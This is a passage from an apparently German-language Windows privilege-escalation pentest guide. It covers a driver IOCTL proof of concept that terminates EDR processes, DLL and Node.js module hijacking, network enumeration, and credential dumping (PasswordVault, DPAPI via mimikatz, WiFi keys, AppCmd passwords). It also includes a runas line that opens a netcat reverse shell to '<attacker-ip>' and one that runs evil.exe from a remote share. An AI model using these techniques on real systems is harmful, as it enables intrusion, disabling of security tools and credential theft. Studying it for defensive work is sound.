Ein aussagekräftiges Hunting-Muster: **heterogene Registry-Lesezugriffe in dieselbe Stack-Variable, ohne sie neu zu initialisieren**. Suche nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Zeigern und Codepfaden, bei denen der erste Registry-Lesezugriff bestimmt, ob ein zweiter erfolgt.

#### Ausnutzen von fehlendem FILE_DEVICE_SECURE_OPEN bei Geräteobjekten (LPE + EDR-Kill)

Einige signierte Treiber von Drittanbietern erstellen ihr Geräteobjekt mit einer strengen SDDL über IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das Gerät über einen Pfad mit zusätzlichem Bestandteil geöffnet wird. Dadurch kann jeder nicht privilegierte Benutzer einen Handle erhalten, indem er einen Namespace-Pfad wie diesen verwendet:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Gerät öffnen kann, lassen sich die vom Treiber bereitgestellten privilegierten IOCTLs für LPE und Manipulation missbrauchen. In freier Wildbahn beobachtete Beispiele für mögliche Aktionen:
- Handles mit Vollzugriff auf beliebige Prozesse zurückgeben (Token-Diebstahl / SYSTEM-Shell über DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkter Rohzugriff zum Lesen/Schreiben von Datenträgern (Offline-Manipulation, Persistenz-Tricks beim Booten).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), wodurch AV/EDR aus dem Userspace heraus über den Kernel beendet werden kann.

Minimales PoC-Muster (Usermode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations für Entwickler
- Setze beim Erstellen von Geräteobjekten, die durch eine DACL eingeschränkt werden sollen, immer FILE_DEVICE_SECURE_OPEN.
- Validiere den Kontext des Aufrufers bei privilegierten Vorgängen. Führe PP/PPL-Prüfungen durch, bevor du das Beenden von Prozessen oder die Rückgabe von Handles erlaubst.
- Beschränke IOCTLs (Zugriffsmasken, METHOD_*, Eingabevalidierung) und ziehe brokerbasierte Modelle anstelle direkter Kernel-Privilegien in Betracht.

Erkennungsideen für Defender
- Überwache Öffnungsversuche aus dem User Mode auf verdächtige Gerätenamen (z. B. \\ .\\amsdk*) und bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Erzwinge Microsofts Sperrliste für anfällige Treiber (HVCI/WDAC/Smart App Control) und pflege eigene Zulassungs- und Sperrlisten.


## PATH DLL Hijacking

Wenn du **Schreibberechtigungen in einem Ordner hast, der in PATH enthalten ist**, kannst du möglicherweise eine von einem Prozess geladene DLL hijacken und **deine Privilegien erweitern**.<sup>[[2]](#references)</sup>

Prüfe die Berechtigungen aller Ordner in PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Weitere Informationen dazu, wie dieser Check ausgenutzt werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking der Node.js-/Electron-Modulauflösung über `C:\node_modules`

Dies ist eine Variante des **unbeaufsichtigten Suchpfads unter Windows**, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen einfachen Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.<sup>[[20]](#references)</sup>

Node löst Pakete auf, indem es den Verzeichnisbaum nach oben durchläuft und in jedem übergeordneten Verzeichnis nach `node_modules`-Ordnern sucht. Unter Windows kann dieser Weg bis zum Stammverzeichnis des Laufwerks führen. Eine Anwendung, die aus `C:\Users\Administrator\project\app.js` gestartet wird, könnte daher folgende Pfade prüfen:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Wenn ein **Benutzer mit geringen Berechtigungen** `C:\node_modules` erstellen kann, kann er dort eine bösartige `foo.js`-Datei (oder einen Paketordner) platzieren und darauf warten, dass ein **Node-/Electron-Prozess mit höheren Berechtigungen** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt. Daher wird daraus **LPE**, wenn das Ziel als Administrator, über eine Aufgabe mit erhöhten Berechtigungen bzw. einen Service-Wrapper oder in einer automatisch gestarteten Desktop-App mit erhöhten Berechtigungen läuft.

Dies kommt besonders häufig vor, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist<sup>[[22]](#references)</sup>
- eine Drittanbieterbibliothek `require("foo")` in `try/catch` einschließt und bei einem Fehler fortfährt
- ein Paket aus Produktions-Builds entfernt, beim Packaging ausgelassen oder nicht installiert wurde
- das anfällige `require()` tief im Abhängigkeitsbaum statt im Code der Hauptanwendung liegt

### Anfällige Ziele aufspüren

Verwende **Procmon**, um den Auflösungspfad nachzuweisen:<sup>[[23]](#references)</sup>

- Filtere nach `Process Name` = ausführbare Datei des Ziels (`node.exe`, die Electron-App-EXE oder der Wrapper-Prozess)
- Filtere nach `Path` `contains` `node_modules`
- Konzentriere dich auf `NAME NOT FOUND` und den abschließenden erfolgreichen Zugriff auf einen Pfad unter `C:\node_modules`

Nützliche Muster für Code-Reviews in entpackten `.asar`-Dateien oder im Anwendungscode:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Ermittle den **fehlenden Paketnamen** mithilfe von Procmon oder einer Überprüfung des Quellcodes.
2. Erstelle das Root-Lookup-Verzeichnis, falls es noch nicht existiert:

```powershell
mkdir C:\node_modules
```

3. Platziere ein Modul mit dem exakt erwarteten Namen:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Lösen Sie die Zielanwendung aus. Wenn die Anwendung `require("foo")` aufruft und das legitime Modul fehlt, lädt Node möglicherweise `C:\node_modules\foo.js`.

Beispiele aus der Praxis für fehlende optionale Module, auf die dieses Muster zutrifft, sind `bluebird` und `utf-8-validate`. Die wiederverwendbare **Technik** besteht jedoch darin, jeden **fehlenden Bare-Import** zu finden, den ein privilegierter Windows-Node-/Electron-Prozess auflösen wird.

### Ideen zur Erkennung und Absicherung

- Alarmieren, wenn ein Benutzer `C:\node_modules` erstellt oder dort neue `.js`-Dateien bzw. Pakete ablegt.
- Nach Prozessen mit hoher Integrität suchen, die auf `C:\node_modules\*` zugreifen.
- In Produktionsumgebungen alle Laufzeitabhängigkeiten paketieren und die Verwendung von `optionalDependencies` überprüfen.
- Code von Drittanbietern auf stille Muster wie `try { require("...") } catch {}` überprüfen.
- Optionale Prüfungen deaktivieren, wenn die Bibliothek dies unterstützt (beispielsweise können manche `ws`-Deployments die veraltete `utf-8-validate`-Prüfung mit `WS_NO_UTF_8_VALIDATE=1` umgehen).

## Netzwerk

### Freigaben

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts-Datei

Prüfe die hosts-Datei auf weitere bekannte Computer, die dort fest eingetragen sind.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netzwerkschnittstellen & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Offene Ports

Prüfe von außen auf **eingeschränkte Dienste**

```bash
netstat -ano #Opened ports?
```

Für einen lokalen Listener sollten Sie seine PID dem Prozessbesitzer, dem ausführbaren Pfad und dem Dienst oder der geplanten Aufgabe zuordnen, die ihn startet. Ein Remote-Control-Dienst kann nur dann Zugriff als sein Desktopbenutzer ermöglichen, wenn seine Authentifizierung und Befehlssteuerung dies zulassen. Eine benutzerdefinierte TCP-Anwendung, die mit einem Konto mit höheren Rechten ausgeführt wird, ist ein separates Prüfziel: Der Listener und der Binärpfad sind passive Anhaltspunkte, während ein authentifizierter Weg über Speicherbeschädigung eine Analyse genau dieser Binärdatei und ihrer erreichbaren Eingaben erfordert. Scheint ein exponierter Port zu einem Systemprozess zu gehören, vergleichen Sie ihn mit [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), bevor Sie den Backend-Dienst zuordnen. Eine Weiterleitungsregel allein beweist nicht, dass das Ziel erreichbar oder verwundbar ist.

### Routingtabelle

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-Tabelle

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-Regeln

[**Auf dieser Seite findest du Befehle zu Firewalls**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Weitere [Befehle zur Netzwerkaufzählung findest du hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die Binärdatei `bash.exe` ist auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` zu finden.

Wenn du Root-Rechte hast, kannst du auf jedem Port lauschen (wenn du `nc.exe` zum ersten Mal zum Lauschen auf einem Port verwendest, wirst du über eine GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Um bash einfach als root zu starten, kannst du `--default-user root` ausprobieren.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` durchsuchen.

Linux-`root` innerhalb von WSL gewährt für sich genommen keine Windows-Administratorrechte. Wenn die aktuelle Windows-Identität das Dateisystem einer Distribution lesen kann, prüfe Shell-Verlaufsdateien (einschließlich `/root/.bash_history`) auf Befehle, die Zugangsdaten enthalten könnten. Eine Rechteausweitung erfordert weiterhin ein gültiges Konto mit höheren Rechten und einen zulässigen Authentifizierungsweg. Das Layout `LocalState\rootfs` gilt für ältere WSL-Installationen; WSL 2 speichert die Distribution üblicherweise auf einer virtuellen [`ext4.vhdx`-Festplatte](https://learn.microsoft.com/en-us/windows/wsl/disk-space). Ermittle daher zuerst die tatsächliche Distribution und den Speicherpfad. Vermeide es, bei automatisierten Aufzählungen Verlaufsinhalte auszugeben.

## Windows-Anmeldeinformationen

### Winlogon-Anmeldeinformationen

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Behandle `DefaultUserName` und `DefaultDomainName` als Kontokontext, nicht als Zugangsdaten. Ein nicht leerer Wert für `DefaultPassword` oder `AltDefaultPassword` ist ein Klartextbefund in der Registry. Wenn `AutoAdminLogon=1` gesetzt ist, aber kein Klartextpasswort lesbar ist, ist das lediglich ein Hinweis: [Sysinternals Autologon kann das Passwort als LSA-Geheimnis speichern](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), und gewöhnliche Registry-Abfragen belegen weder, ob dieses Geheimnis existiert, noch ob es abgerufen werden kann. Prüfe Zugriffsrechte und die tatsächliche Anmeldekonfiguration, bevor du eine Offenlegung von Zugangsdaten meldest.

### Anmeldeinformationsverwaltung / Windows-Tresor

Aus [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, mit denen **Windows** **Benutzer automatisch anmelden** kann. Zunächst klingt es vielleicht so, als könnten Benutzer Anmeldeinformationen für Websites wie Facebook, Twitter oder Gmail speichern und sich von Browsern automatisch anmelden lassen, doch so funktioniert es nicht.

Windows Vault speichert Anmeldeinformationen, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen für den Zugriff auf eine Ressource** (einen Server oder eine Website) benötigt, **diesen Anmeldeinformations-Manager** und Windows Vault verwenden und die bereitgestellten Anmeldeinformationen nutzen kann, anstatt dass Benutzer ständig ihren Benutzernamen und ihr Passwort eingeben müssen.

Wenn die Anwendungen nicht mit dem Anmeldeinformations-Manager interagieren, können sie die Anmeldeinformationen für eine bestimmte Ressource meiner Meinung nach nicht verwenden. Wenn deine Anwendung also den Tresor nutzen soll, muss sie irgendwie **mit dem Anmeldeinformations-Manager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem Standardspeichertresor anfordern.

Verwende `cmdkey`, um die auf dem Computer gespeicherten Anmeldeinformationen aufzulisten.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Dann kannst du `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldedaten zu nutzen. Das folgende Beispiel ruft eine Remote-Binärdatei über eine SMB-Freigabe auf.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldedaten.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder das Modul [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwendet werden können.

### UWP PasswordVault / Credential Locker

Moderne Windows-UWP-Anwendungen, Microsoft Edge und moderne Systemdienste speichern Authentifizierungstoken und Klartextpasswörter im `PasswordVault` der Universal Windows Platform (UWP) (in `vaultcmd` auch als `Web Credentials` verfügbar). Dieser Speicherbereich ist sitzungsisoliert und kann nativ entschlüsselt werden, ohne Administratorrechte oder `SeDebugPrivilege`.

Führe diesen PowerShell-Befehl in der aktiven Sitzung des Benutzers aus, um sofort alle gespeicherten Benutzernamen und Klartextpasswörter zu dumpen und zu entschlüsseln:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird im Windows-Betriebssystem überwiegend zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um die Entropie deutlich zu erhöhen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mithilfe eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei der Systemverschlüsselung werden die Domänenauthentifizierungsgeheimnisse des Systems verwendet.

Mit DPAPI verschlüsselte RSA-Schlüssel von Benutzern werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` für den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers steht. **Der DPAPI-Schlüssel, der zusammen mit dem Hauptschlüssel, der die privaten Schlüssel des Benutzers schützt, in derselben Datei abgelegt ist**, besteht in der Regel aus 64 Byte zufälliger Daten. (Beachten Sie, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist und seine Inhalte daher nicht mit dem Befehl `dir` in CMD aufgelistet werden können. Über PowerShell ist dies jedoch möglich.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Du kannst das **mimikatz-Modul** `dpapi::masterkey` mit den passenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die durch das **Master-Passwort** geschützten Anmeldedatendateien befinden sich normalerweise hier:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Sie können das **mimikatz-Modul** `dpapi::cred` mit dem passenden `/masterkey` zum Entschlüsseln verwenden.\
Mit dem Modul `sekurlsa::dpapi` können Sie viele DPAPI-**masterkeys** aus dem **Arbeitsspeicher** extrahieren (wenn Sie root sind).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden häufig für **Scripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Sie sind mit **DPAPI** geschützt. Das bedeutet in der Regel, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Eine exportierte Anmeldeinformation kann einen beliebigen Dateinamen oder einen `.xml`-Pfad haben. Wenn ein Skript oder ein Dateiinventar darauf verweist, ermitteln Sie das tatsächliche Profilverzeichnis des Kontos, statt `C:\Users` anzunehmen: [Windows kann Profile an anderen Speicherorten ablegen](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Eine lesbare Datei ist lediglich ein Hinweis; [Windows `Export-Clixml` bindet eine verschlüsselte Anmeldeinformation an den exportierenden Benutzer und Computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), und jedes wiederhergestellte Konto muss separat über gültige Berechtigungen für den vorgesehenen Dienst verfügen. Prüfen Sie zunächst Pfade und ACLs, ohne bei der routinemäßigen Bestandsaufnahme verschlüsselte oder Klartextwerte auszugeben.

Um **PowerShell-Anmeldeinformationen** aus der Datei zu **entschlüsseln**, in der sie enthalten sind, können Sie Folgendes tun:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### WLAN

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gespeicherte RDP-Verbindungen

Sie finden sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Zuletzt ausgeführte Befehle

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Anmeldeinformationsverwaltung für Remotedesktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Verwenden Sie das **Mimikatz**-Modul `dpapi::rdg` mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Mit dem Mimikatz-Modul `sekurlsa::dpapi` können Sie **viele DPAPI-Masterkeys** aus dem Arbeitsspeicher **extrahieren**.

**mRemoteNG verwendet einen anderen Verbindungsspeicher.** Untersuchen Sie lesbare XML-Dateien unter `%APPDATA%\mRemoteNG` und in den Dokumenten der Benutzer, einschließlich Dateien mit gewöhnlichen Namen wie `config.xml`. Ermitteln Sie das Verbindungsschema und verschlüsselte `Password`-Attribute, bevor Sie eine XML-Datei als möglichen Hinweis auf Zugangsdaten behandeln. Der gespeicherte Wert ist kein DPAPI-/RDCMan-Passwort. Die Wiederherstellung hängt von den Verschlüsselungseinstellungen der Datei und davon ab, ob ein benutzerdefiniertes Masterpasswort verwendet wurde. Vermeiden Sie es, bei einer umfangreichen Suche verschlüsselte Werte auszugeben.

**Exporte von Remote Desktop Plus-Profilen** können ebenfalls in Benutzerverzeichnissen oder einem gemeinsamen Administrationsordner lesbar sein. Ein älterer `profiles.xml`-Export enthält Einträge unter `Data/Profile` mit den Elementen `ProfileName`, `Password` und `Secure`. Behandeln Sie ein nicht leeres Passwortelement als möglichen Hinweis auf Zugangsdaten, ohne es auszugeben oder davon auszugehen, dass es im Klartext vorliegt: [Der Hersteller weist darauf hin](https://www.donkz.nl/), dass der Profilschutz an das Konto und den Computer gebunden sein kann, auf dem das Profil erstellt wurde, oder weniger strikt konfiguriert sein kann. Prüfen Sie Herkunft und Bedingungen für die Wiederherstellung der Datei, bevor Sie sich darauf verlassen.

### Sticky Notes

Manchmal speichern Benutzer Passwörter und andere Informationen in Haftnotizen-Apps. Die von Microsoft bereitgestellte Sticky-Notes-App speichert Notizen üblicherweise unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ältere oder andere Apps können andere Speicherorte im Benutzerprofil verwenden, darunter LevelDB. Ermitteln Sie die installierte App und das Speicherformat, bevor Sie aus einer fehlenden SQLite-Datei schließen, dass keine Notizen vorhanden sind.

Wenn Sticky Notes SQLite Write-Ahead Logging verwendet, enthält eine Kopie von `plum.sqlite` möglicherweise nicht alle zuletzt bestätigten Notizen. Bewahren Sie die passende `plum.sqlite-wal` zusammen mit einer konsistenten Kopie der Datenbank auf und fügen Sie, falls verfügbar, auch `plum.sqlite-shm` hinzu. Der Index im Shared Memory kann neu erstellt werden, aber die WAL-Datei gehört zum dauerhaften Zustand der Datenbank. Siehe [SQLite-Dokumentation zu WAL](https://www.sqlite.org/wal.html). Eine Notiz mit einem Kontonamen oder Passwort ist lediglich ein möglicher Hinweis auf Zugangsdaten: Überprüfen Sie das Konto, die zulässigen Zugriffsrechte und eine mögliche Wiederverwendung des Passworts separat. Ein verschlüsselter Eintrag eines Passwort-Managers erfordert außerdem den tatsächlichen Entschlüsselungsschlüssel und eine anwendungsspezifische Interpretation, bevor er als Beleg für eine Anmeldung mit höheren Rechten dienen kann.

### AppCmd.exe

**Beachten Sie, dass Sie Administrator sein und mit hoher Integritätsstufe ausgeführt werden müssen, um Passwörter aus AppCmd.exe wiederherzustellen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei vorhanden ist, wurden möglicherweise einige **Zugangsdaten** konfiguriert und können **wiederhergestellt** werden.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) übernommen:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Prüfen Sie, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist .\
Installationsprogramme werden **mit SYSTEM-Berechtigungen ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dateien und Registry (Zugangsdaten)

### Registry-Artefakte für Zugangsdaten von Support-Tools

Einige ältere Remote-Support-Installationen behalten passwortbezogene Wertnamen unter festen Anwendungs-Registry-Schlüsseln bei. Beispielsweise bezeichnete `SecurityPasswordAES` von TeamViewer laut [Erklärung des Herstellers zu Registry-Schlüsseln](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) in Versionen vor 9 ein konfiguriertes statisches Sitzungspasswort. Ein Wertnamen-Marker ist lediglich ein Hinweis für die Prüfung: Verifizieren Sie die installierte Version, lesbare Wertdaten, das Format und das aktuelle Authentifizierungsverhalten, bevor Sie diese Zugangsdaten bewerten. Der Wechsel von einem Remote-Support-Passwort zu einem höher privilegierten Windows-Konto setzt außerdem voraus, dass das Passwort tatsächlich wiederverwendet wird und für dieses Konto eine Berechtigung besteht. Geben Sie Chiffretext und wiederhergestellte Passwörter nicht in routinemäßigen Aufzählungsausgaben aus.

### Freigegebene Tabellen mit geschützten Arbeitsblättern

Wenn vermutet wird, dass eine lesbare freigegebene Arbeitsmappe Kontodaten enthält, unterscheiden Sie zwischen **Dateiverschlüsselung** und Arbeitsblattschutz oder ausgeblendeten Spalten. [Microsoft erklärt](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), dass der Arbeitsblattschutz die Bearbeitung einschränkt und kein Sicherheitsfeature ist; er belegt für sich genommen nicht, dass die Inhalte der Arbeitsmappe verschlüsselt sind. Prüfen Sie nur autorisierte, relevante Dateien und geben Sie bei einer umfangreichen Aufzählung keine möglichen Geheimnisse aus. Ein lesbarer `.xlsx`-Pfad, ein geschütztes Arbeitsblatt oder eine ausgeblendete Spalte allein beweist weder, dass Zugangsdaten vorhanden sind, noch, dass ein Konto höhere Berechtigungen hat; überprüfen Sie die tatsächlichen Daten und die aktuellen Kontoberechtigungen separat.

### Gespeicherte Änderungspatches auf CI-Servern

